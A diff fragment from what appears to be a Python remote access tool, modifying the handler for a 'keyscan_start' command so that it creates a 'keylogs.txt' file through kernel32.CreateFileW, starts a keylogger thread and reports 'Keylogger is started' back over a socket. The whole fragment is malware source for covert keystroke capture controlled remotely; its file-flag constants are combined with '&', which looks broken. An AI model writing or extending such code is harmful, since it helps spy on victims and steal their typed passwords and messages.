@@ -375,6 +375,9 @@ User: {os.getlogin()}
             elif command == 'keyscan_start':
                 global klgr
                 klgr = True
+                kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
+                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
+                None, CREATE_ALWAYS , 0, 0)
                 Thread(target=self.keylogger, daemon=True).start()
                 s.send("Keylogger is started".encode())
             
